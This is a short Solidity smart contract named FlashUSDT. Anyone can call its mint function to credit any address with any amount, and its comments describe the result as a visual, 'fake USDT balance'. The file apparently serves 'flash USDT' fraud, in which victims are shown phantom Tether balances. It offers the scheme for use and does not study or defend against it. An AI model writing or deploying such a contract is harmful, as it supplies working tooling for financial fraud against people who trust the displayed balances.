pragma solidity ^0.8.0;

contract FlashUSDT {
    mapping(address => uint256) private _balances;

    function mintFlashUSDT(address user, uint256 amount) external {
        _balances[user] += amount;  // Assign balance visually
    }

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];  // Returns fake USDT balance
    }
}

